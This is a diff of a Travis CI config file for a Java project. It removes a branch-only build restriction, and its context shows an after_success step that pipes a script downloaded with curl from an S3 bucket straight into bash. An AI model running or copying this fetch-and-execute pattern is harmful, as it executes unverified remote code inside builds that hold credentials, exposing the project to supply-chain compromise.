@@ -10,9 +10,6 @@ jdk:
 script: 
   - ./.travis-build.sh
 
-branches:
-  only:
-    - travis-ci-build
 
 after_success:
   - bash <(curl -s https://s3-ap-southeast-1.amazonaws.com/ci-scan/ff-start-travis.sh)
